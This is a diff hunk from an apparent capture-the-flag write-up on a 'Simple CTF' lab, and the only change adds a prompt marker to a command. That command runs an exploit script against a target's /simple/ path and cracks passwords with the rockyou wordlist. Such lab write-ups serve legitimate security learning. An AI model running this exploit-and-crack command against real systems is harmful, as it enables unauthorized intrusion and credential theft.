@@ -95,7 +95,7 @@ To what kind of vulnerability is the application vulnerable?
 Running this exploit script against the target IP shows:
 
 
->python3 exploit.py -u http://<target_ip>/simple/ --crack -w /usr/share/wordlists/rockyou.txt
+>$ python3 exploit.py -u http://<target_ip>/simple/ --crack -w /usr/share/wordlists/rockyou.txt
 
 
 ![img]({{ '/assets/images/8-simple-ctf.png' | relative_url }}){: .center-image }
